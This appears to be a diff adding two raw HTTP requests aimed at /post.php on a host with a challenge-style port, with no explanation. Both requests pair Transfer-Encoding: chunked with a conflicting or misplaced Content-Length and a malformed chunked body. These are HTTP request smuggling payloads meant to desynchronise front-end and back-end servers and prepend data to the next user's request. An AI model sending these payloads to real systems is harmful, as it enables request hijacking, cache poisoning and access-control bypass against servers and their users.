@@ -1,0 +1,29 @@
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Transfer-Encoding: chunked
+Cookie: PHPSESSID=0a662729cca044895c3ef0c8f94f2682 
+
+Content-Length: 4
+
+1
+A
+X
+0
+
+
+====
+
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Cache-Control: max-age=0
+Content-Length: 8
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+G
